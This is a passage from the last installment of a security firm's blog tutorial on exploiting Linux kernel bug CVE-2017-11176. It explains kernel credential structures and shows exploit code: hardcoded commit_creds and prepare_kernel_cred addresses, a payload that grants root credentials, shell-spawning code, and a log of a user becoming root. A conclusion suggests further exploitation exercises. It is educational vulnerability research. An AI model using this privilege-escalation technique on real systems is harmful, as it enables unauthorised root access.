<span class="w">    </span><span class="n">kernel_cap_t</span><span class="w">    </span><span class="n">cap_bset</span><span class="p">;</span><span class="w">   </span><span class="cm">/* capability bounding set */</span><span class="w"></span>
<span class="w">  </span><span class="c1">// ... cut ...</span>
<span class="cp">#ifdef CONFIG_SECURITY</span>
<span class="w">    </span><span class="kt">void</span><span class="w">        </span><span class="o">*</span><span class="n">security</span><span class="p">;</span><span class="w">  </span><span class="cm">/* subjective LSM security */</span><span class="w"></span>
<span class="cp">#endif</span>
<span class="w">  </span><span class="c1">// ... cut ...</span>
<span class="p">};</span><span class="w"></span>
</code></pre></div><p>Each task (i.e. <em>task_struct</em>), has two <em>struct creds</em>:</p><div class="highlight"><pre><span></span><code><span class="k">struct</span> <span class="nc">task_struct</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="c1">// ... cut ...</span>
<span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="k">struct</span> <span class="nc">cred</span><span class="w"> </span><span class="o">*</span><span class="n">real_cred</span><span class="p">;</span><span class="w">   </span><span class="cm">/* objective and real subjective task credentials (COW) */</span><span class="w"></span>
<span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="k">struct</span> <span class="nc">cred</span><span class="w"> </span><span class="o">*</span><span class="n">cred</span><span class="p">;</span><span class="w">    </span><span class="cm">/* effective (overridable) subjective task</span>
<span class="cm">  // ... cut ...</span>
<span class="cm">};</span>
</code></pre></div><p>You might already be familiar with <strong>uid/gid</strong> and <strong>euid/egid</strong>. Surprisingly, what matters the most is actually capabilities! If you look at various system call (e.g. <em>chroot()</em>), most of them start with <strong>!capable(CAP_SYS_xxx)</strong> code:</p><div class="highlight"><pre><span></span><code><span class="n">SYSCALL_DEFINE1</span><span class="p">(</span><span class="n">chroot</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">__user</span><span class="w"> </span><span class="o">*</span><span class="p">,</span><span class="w"> </span><span class="n">filename</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="c1">// ... cut ...</span>

<span class="w">    </span><span class="n">error</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">-</span><span class="n">EPERM</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">capable</span><span class="p">(</span><span class="n">CAP_SYS_CHROOT</span><span class="p">))</span><span class="w"></span>
<span class="w">        </span><span class="k">goto</span><span class="w"> </span><span class="n">dput_and_out</span><span class="p">;</span><span class="w"></span>

<span class="w">  </span><span class="c1">// ... cut ...</span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>You will rarely see (ever?) a code with <em>(current-&gt;real_cred-&gt;uid == 0)</em> in kernel code (unlike userland code). In other words, just "writing zeroes" into your own <em>struct cred</em> ids is not enough.</p><p>In addition, you will see a lot of functions starting with <strong>security_xxx()</strong> prefixe. For instance:</p><div class="highlight"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="kr">inline</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">__sock_sendmsg</span><span class="p">(</span><span class="k">struct</span> <span class="nc">kiocb</span><span class="w"> </span><span class="o">*</span><span class="n">iocb</span><span class="p">,</span><span class="w"> </span><span class="k">struct</span> <span class="nc">socket</span><span class="w"> </span><span class="o">*</span><span class="n">sock</span><span class="p">,</span><span class="w"></span>
<span class="w">                 </span><span class="k">struct</span> <span class="nc">msghdr</span><span class="w"> </span><span class="o">*</span><span class="n">msg</span><span class="p">,</span><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="n">size</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">security_socket_sendmsg</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="n">msg</span><span class="p">,</span><span class="w"> </span><span class="n">size</span><span class="p">);</span><span class="w"></span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">err</span><span class="w"> </span><span class="o">?:</span><span class="w"> </span><span class="n">__sock_sendmsg_nosec</span><span class="p">(</span><span class="n">iocb</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="n">msg</span><span class="p">,</span><span class="w"> </span><span class="n">size</span><span class="p">);</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>This kind of function comes from <strong>Linux Security Modules (LSM)</strong> and uses the <em>security</em> field of a <em>struct cred</em>. A well-known LSM is <em>SELinux</em>. The main purpose of LSM is to enforce access rights.</p><p>So, there are: uids, capabilities, security, etc. What should we do? Just patch <strong>the whole struct cred</strong>? You can, but there is something better... Change the <em>real_cred</em> and <em>cred</em> pointers in our <em>task_struct</em>? Getting closer...</p><p>The problem with "overwriting" those pointers manually is: what value will you overwrite with? Scan root's task and use those values? Nope! <strong>The <em>struct cred</em> are refcounted!</strong> Without taking a reference, you just introduced a double refcounter decrease (just like our bug ironically).</p><p>There is actually a function that does all of those refcounting housekeeping for you:</p><div class="highlight"><pre><span></span><code><span class="kt">int</span><span class="w"> </span><span class="nf">commit_creds</span><span class="p">(</span><span class="k">struct</span> <span class="nc">cred</span><span class="w"> </span><span class="o">*</span><span class="n">new</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">task_struct</span><span class="w"> </span><span class="o">*</span><span class="n">task</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">current</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="k">struct</span> <span class="nc">cred</span><span class="w"> </span><span class="o">*</span><span class="n">old</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">task</span><span class="o">-&gt;</span><span class="n">real_cred</span><span class="p">;</span><span class="w"></span>

<span class="w">  </span><span class="c1">// ... cut ...</span>

<span class="w">    </span><span class="n">get_cred</span><span class="p">(</span><span class="n">new</span><span class="p">);</span><span class="w">      </span><span class="c1">// &lt;---- take a reference</span>

<span class="w">  </span><span class="c1">// ... cut ...</span>

<span class="w">    </span><span class="n">rcu_assign_pointer</span><span class="p">(</span><span class="n">task</span><span class="o">-&gt;</span><span class="n">real_cred</span><span class="p">,</span><span class="w"> </span><span class="n">new</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="n">rcu_assign_pointer</span><span class="p">(</span><span class="n">task</span><span class="o">-&gt;</span><span class="n">cred</span><span class="p">,</span><span class="w"> </span><span class="n">new</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="c1">// ... cut ...</span>

<span class="w">    </span><span class="cm">/* release the old obj and subj refs both */</span><span class="w"></span>
<span class="w">    </span><span class="n">put_cred</span><span class="p">(</span><span class="n">old</span><span class="p">);</span><span class="w">      </span><span class="c1">// &lt;----- release previous references</span>
<span class="w">    </span><span class="n">put_cred</span><span class="p">(</span><span class="n">old</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>Nice, but it needs a valid <em>struct cred</em> in parameters. So, it is time to meet his buddy: <strong>prepare_kernel_cred()</strong>:</p><div class="highlight"><pre><span></span><code><span class="k">struct</span> <span class="nc">cred</span><span class="w"> </span><span class="o">*</span><span class="n">prepare_kernel_cred</span><span class="p">(</span><span class="k">struct</span> <span class="nc">task_struct</span><span class="w"> </span><span class="o">*</span><span class="n">daemon</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="k">struct</span> <span class="nc">cred</span><span class="w"> </span><span class="o">*</span><span class="n">old</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">cred</span><span class="w"> </span><span class="o">*</span><span class="n">new</span><span class="p">;</span><span class="w"></span>

<span class="w">    </span><span class="n">new</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">kmem_cache_alloc</span><span class="p">(</span><span class="n">cred_jar</span><span class="p">,</span><span class="w"> </span><span class="n">GFP_KERNEL</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">new</span><span class="p">)</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"></span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">daemon</span><span class="p">)</span><span class="w"></span>
<span class="w">        </span><span class="n">old</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">get_task_cred</span><span class="p">(</span><span class="n">daemon</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">else</span><span class="w"></span>
<span class="w">        </span><span class="n">old</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">get_cred</span><span class="p">(</span><span class="o">&amp;</span><span class="n">init_cred</span><span class="p">);</span><span class="w">     </span><span class="c1">// &lt;----- THIS!</span>

<span class="w">    </span><span class="n">validate_creds</span><span class="p">(</span><span class="n">old</span><span class="p">);</span><span class="w"></span>

<span class="w">    </span><span class="o">*</span><span class="n">new</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="n">old</span><span class="p">;</span><span class="w">                      </span><span class="c1">// &lt;----- copy all fields</span>

<span class="w">  </span><span class="c1">// ... cut ...</span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>Basically, what <em>prepare_kernel_cred()</em> does is: allocates a new <em>struct cred</em> and fills it from the current's one. However, <strong>if the parameter is NULL, it will copy the <em>init</em> process' cred</strong>, the most privilegied process on the system (which also runs in "root")!</p><p>You get it, we only need to call this:</p><div class="highlight"><pre><span></span><code><span class="n">commit_cred</span><span class="p">(</span><span class="n">prepare_kernel_cred</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span><span class="w"></span>
</code></pre></div><p>That's all! In addition, it will release our previous <em>struct cred</em> cleanly. Let's update the exploit:</p><div class="highlight"><pre><span></span><code><span class="cp">#define COMMIT_CREDS          ((void*) 0xffffffff810b8ee0)</span>
<span class="cp">#define PREPARE_KERNEL_CRED   ((void*) 0xffffffff810b90c0)</span>

<span class="k">typedef</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="n">commit_creds_func</span><span class="p">)(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">new</span><span class="p">);</span><span class="w"></span>
<span class="k">typedef</span><span class="w"> </span><span class="kt">void</span><span class="o">*</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="n">prepare_kernel_cred_func</span><span class="p">)(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">daemon</span><span class="p">);</span><span class="w"></span>

<span class="cp">#define commit_creds(cred) \</span>
<span class="cp">  (((commit_creds_func)(COMMIT_CREDS))(cred))</span>
<span class="cp">#define prepare_kernel_cred(daemon) \</span>
<span class="cp">  (((prepare_kernel_cred_func)(PREPARE_KERNEL_CRED))(daemon))</span>

<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">payload</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="c1">// ... cut ...</span>

<span class="w">  </span><span class="c1">// release the lock</span>
<span class="w">  </span><span class="n">netlink_table_ungrab</span><span class="p">();</span><span class="w"></span>

<span class="w">  </span><span class="c1">// privilege (de-)escalation</span>
<span class="w">  </span><span class="n">commit_creds</span><span class="p">(</span><span class="n">prepare_kernel_cred</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>And add the "popping shell" code:</p><div class="highlight"><pre><span></span><code><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="c1">// ... cut ...</span>

<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[+] exploit complete!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[ ] popping shell now!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">shell</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">"/bin/bash"</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">args</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="n">shell</span><span class="p">,</span><span class="w"> </span><span class="s">"-i"</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">};</span><span class="w"></span>
<span class="w">    </span><span class="n">execve</span><span class="p">(</span><span class="n">shell</span><span class="p">,</span><span class="w"> </span><span class="n">args</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>

<span class="nl">fail</span><span class="p">:</span><span class="w"></span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[-] exploit failed!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="n">PRESS_KEY</span><span class="p">();</span><span class="w"></span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>Which gives:</p><div class="highlight"><pre><span></span><code>[user@localhost tmp]$ id; ./exploit
uid=1000(user) gid=1000(user) groups=1000(user)
[ ] -={ CVE-2017-11176 Exploit }=-
[+] successfully migrated to CPU#0
...
[+] arbitrary call succeed!
[+] exploit complete!
[ ] popping shell now!
[root@localhost tmp]# id
uid=0(root) gid=0(root) groups=0(root)
</code></pre></div><p>Now we are really done! Remember, you have <strong>ring-0 arbitrary code execution</strong> this is "more privileged" than "root". Use it wisely, and have fun :-)!</p><hr><h1 id="conclusion">Conclusion</h1><p><strong>Congratulations, you made it!</strong></p><p>First, I would like to thank you for getting to that point. Writing your first kernel exploit is a daunting task that discourages most people. It requires to understand a lot of stuff at once, patience and pugnacity.</p><p>Furthermore, we kinda made it the "hard way" (no show off) by exploiting a <em>use-after-free</em> (a memory corruption bug). You might find shorter exploit that only have small amount of code (some have fewer than 10 lines!). Those exploit "logical bug" which is considered by some to be the best class of bug (targetless, reliable, fast, etc.). Nevertheless, they can be very specific and might not expose as many subsystems as we've seen here.</p><p><em>Use-after-free</em> are still pretty common at the time of writing (2018). They can be more or less hard to detect by fuzzer or manual code review. In particular, the bug we exploited here existed because of <strong>a single missing line</strong>. In addition, it is only triggered during a <em>race condition</em> which makes it even harder to detect.</p><p>During this series, we barely scratched the surface of the following Linux kernel subsystems (from makelinux.net):</p><p></p><figure><img src="./2018 - CVE-2017-11176 A step-by-step Linux Kernel exploitation part 4_files/kernel_map.jpg" title="Linux Kernel Map"><figcaption class="figcaption figure-caption text-center">kernel_map.jpg</figcaption></figure><p></p><p>Hopefully, you are now more familiar with the terms written there. As you can see, this is still a long road... :-)</p><p>Alright, let's sum up what we've done.</p><p>In <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html">part 1</a>, we introduced the basics of the "virtual file system" (what is a file? a FDT? VFT?) as well as the refcounting facility. By studying public information (CVE description, patch) we got a better understanding of the bug and designed an attack scenario. Then, we implemented it in kernel-land using SystemTap (a very handy tool!).</p><p>In <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part2.html">part 2</a>, we introduced the "scheduler subsystem" and more specifically the "wait queues". Understanding it allowed us to unconditionally win the race condition. By doing a meticulous analysis of several kernel code paths, we were able to tailor our syscalls and build the <em>proof-of-concept</em> with userland code. It provoked our first kernel crashes.</p><p>In <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html">part 3</a>, we introduced the "memory subsystem" and focus on the SLAB allocator, a must have to exploit most use-after-free and/or heap overflow bugs. After analysing in deeper details all information required to exploit the UAF, we found a way to gain an arbitrary call primitive by using type confusion and make the netlink socket's wait queue pointing into userland. In addition, we implemented the reallocation using a well-known reallocation gadget: ancillary data buffer.</p><p>In this final part, we saw a lot of "low-level" and "architecture-dependent" things relative to x86-64 (kernel stacks, virtual memory layout, thread_info). In order to gain arbitrary code execution we hit a hardware security feature: SMEP. Understanding the x86-64 access rights determination, as well as page fault exception traces, we designed an exploitation strategy to bypass it (disable it with ROP-chains).</p><p>Gaining the arbitrary execution was only part of the success as we still needed to repair the kernel. While repairing the socket dangling pointer was pretty straightforward, repairing the hash list brought several difficulties that we overcame by having a good understanding of the netlink code (data structures, algorithms, procfs). In the end, we got a root shell by calling only two kernel functions and analyzed the exploit weaknesses (reliability).</p><hr><h1 id="going-further">Going Further</h1><p>What to do next?</p><p>If you want to improve this exploit, there are still plenty of stuff to do. For instance, can you re-enable SMEP with ROP, and more interestingly, without ROP (play with the PTEs, map executable code into kernel land, etc.). You may want to add another reallocation gadget in your toolbox, have a look at <em>msgsnd()</em> and find a way to drastically improve the reallocation success rate. A more challenging exercise could be to gain arbitrary code execution without using any ROP (remember, you can change <em>func</em> and call it as many times as you want).</p><p>Now, consider there is SMAP on your target, can we still exploit the bug this way? If not, what to do? Maybe the arbitrary call primitive is not the good one... Sooner or later you will understand that gaining arbitrary read/write is actually much better as it allows to bypass almost any security protection.</p><p>If you want to move on, pick another CVE and try to do the same job that we did here. Understand the bug, code the PoC, build the exploit. Never trust the CVE description that qualifies a bug as a DoS and/or have a "low/moderate" criticity. Really, developing CVE exploits is a good way to understand the Linux kernel as they will just not work if you don't understand what is going on.</p><p>As a final note, I wish you a warm welcome into the kernel hacking world. I hope you enjoyed this series, learned a lot and want to learn even more! Thanks for reading.</p><p><em>"Salut, et merci pour le poisson !"</em></p></div><div class="blog-post-meta mt-4"><div class="share" id="post-share-links"><div class="share-twitter"><a href="https://twitter.com/intent/tweet?text=CVE-2017-11176%3A%20A%20step-by-step%20Linux%20Kernel%20exploitation%20%28part%204/4%29&amp;url=https%3A//blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part4.html" rel="nofollow noopener" target="_blank"><span><svg aria-hidden="true" class="svg-inline--fa fa-twitter fa-w-16" data-prefix="fab" data-icon="twitter" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"></path></svg><!-- <i aria-hidden="true" class="fab fa-twitter"></i> -->Tweet</span></a></div><div class="share-facebook"><a href="http://www.facebook.com/sharer/sharer.php?u=https%3A//blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part4.html" rel="nofollow noopener" target="_blank"><span><svg aria-hidden="true" class="svg-inline--fa fa-facebook fa-w-14" data-prefix="fab" data-icon="facebook" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M448 56.7v398.5c0 13.7-11.1 24.7-24.7 24.7H309.1V306.5h58.2l8.7-67.6h-67v-43.2c0-19.6 5.4-32.9 33.5-32.9h35.8v-60.5c-6.2-.8-27.4-2.7-52.2-2.7-51.6 0-87 31.5-87 89.4v49.9h-58.4v67.6h58.4V480H24.7C11.1 480 0 468.9 0 455.3V56.7C0 43.1 11.1 32 24.7 32h398.5c13.7 0 24.8 11.1 24.8 24.7z"></path></svg><!-- <i aria-hidden="true" class="fab fa-facebook"></i> -->Share</span></a></div><div class="share-linkedin"><a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3A//blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part4.html&amp;title=CVE-2017-11176%3A%20A%20step-by-step%20Linux%20Kernel%20exploitation%20%28part%204/4%29&amp;summary=In%20the%20last%20article%2C%20the%20arbitrary%20call%20primitive%20is%20used%20to%20gain%20arbitrary%20code%20execution%20in%20ring-0%20while%20bypassing%20SMEP.%20It%20covers%20an%20extensive%20study%20of%20page%20fault%20exception%20trace%2C%20how%20to%20find%20gadgets%20in%20kernel%20image%2C%20designing%20a%20ROP-chain%20to%20finally%20call%20the%20payload.%20In%20the%20end%2C%20it%20shows%20how%20to%20repair%20the%20kernel%20and%20gain%20root%20privileges.%20The%20core%20concept%20section%20focuses%20on%20the%20thread_info%20structure%2C%20virtual%20memory%20layout%20and%20netlink%27s%20hash%20tables.&amp;source=https%3A//blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part4.html" rel="nofollow noopener" target="_blank"><span><svg aria-hidden="true" class="svg-inline--fa fa-linkedin fa-w-14" data-prefix="fab" data-icon="linkedin" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"></path></svg><!-- <i aria-hidden="true" class="fab fa-linkedin"></i> -->Share</span></a></div><div class="share-email"><a href="mailto:?subject=CVE-2017-11176%3A%20A%20step-by-step%20Linux%20Kernel%20exploitation%20%28part%204/4%29&amp;body=https%3A//blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part4.html" rel="nofollow noopener" target="_blank"><span><svg aria-hidden="true" class="svg-inline--fa fa-envelope fa-w-16" data-prefix="far" data-icon="envelope" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M464 64H48C21.49 64 0 85.49 0 112v288c0 26.51 21.49 48 48 48h416c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm0 48v40.805c-22.422 18.259-58.168 46.651-134.587 106.49-16.841 13.247-50.201 45.072-73.413 44.701-23.208.375-56.579-31.459-73.413-44.701C106.18 199.465 70.425 171.067 48 152.805V112h416zM48 400V214.398c22.914 18.251 55.409 43.862 104.938 82.646 21.857 17.205 60.134 55.186 103.062 54.955 42.717.231 80.509-37.199 103.053-54.947 49.528-38.783 82.032-64.401 104.947-82.653V400H48z"></path></svg><!-- <i aria-hidden="true" class="far fa-envelope"></i> -->Share</span></a></div></div></div></div></article></div></main><footer class="container-fluid bg-white"><div class="row py-2" style="background-color: rgb(179,32,39);"><div class="col-12 text-center footer-text"><h3 class="text-light">LEXFO - Because information security is essential</h3></div></div><div class="row"><div class="col-12 text-center mt-3"><h3 class="txtcenter">Contact us</h3></div></div><div class="row mt-3"><div class="col-sm-3 text-center"><img alt="Adresse" class="mb-2" src="./2018 - CVE-2017-11176 A step-by-step Linux Kernel exploitation part 4_files/map.png"><h4>Our address</h4><address><p>5, rue Drouot<br> 75009 PARIS, FRANCE</p></address></div><div class="col-sm-3 text-center"><img alt="Email" class="mb-2" src="./2018 - CVE-2017-11176 A step-by-step Linux Kernel exploitation part 4_files/email.png"><h4>By email</h4><p>contact [at] lexfo [dot] fr</p></div><div class="col-sm-3 text-center"><img alt="Téléphone" class="mb-2" src="./2018 - CVE-2017-11176 A step-by-step Linux Kernel exploitation part 4_files/tel.png"><h4>By phone</h4><p>+33 1 40 17 91 28</p></div><div class="col-sm-3 text-center"><a href="https://twitter.com/LexfoSecurite" style="background: transparent;"><img alt="@LexfoSecurite, Lexfo&#39;s twitter account" class="mb-2" src="./2018 - CVE-2017-11176 A step-by-step Linux Kernel exploitation part 4_files/twitter.png"></a><h4>On Twitter</h4><p><a href="https://twitter.com/LexfoSecurite">@LexfoSecurite</a></p></div></div><div class="row mt-1"><div class="col-12 text-center"><p><a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part4.html#logo">Back to the top</a></p></div></div><div class="row mt-1"><div class="col-12 text-center"><p>© LEXFO 2020 - All rights reserved</p></div></div></footer><script src="./2018 - CVE-2017-11176 A step-by-step Linux Kernel exploitation part 4_files/packed.js.下載"></script><script src="./2018 - CVE-2017-11176 A step-by-step Linux Kernel exploitation part 4_files/all.min.js.下載"></script><script>
               $(document).ready(function () { $("table").attr("class","table table-condensed table-bordered"); });
               $(document).ready(function () { $("figcaption").attr("class","figcaption figure-caption text-center"); });
        </script></body></html>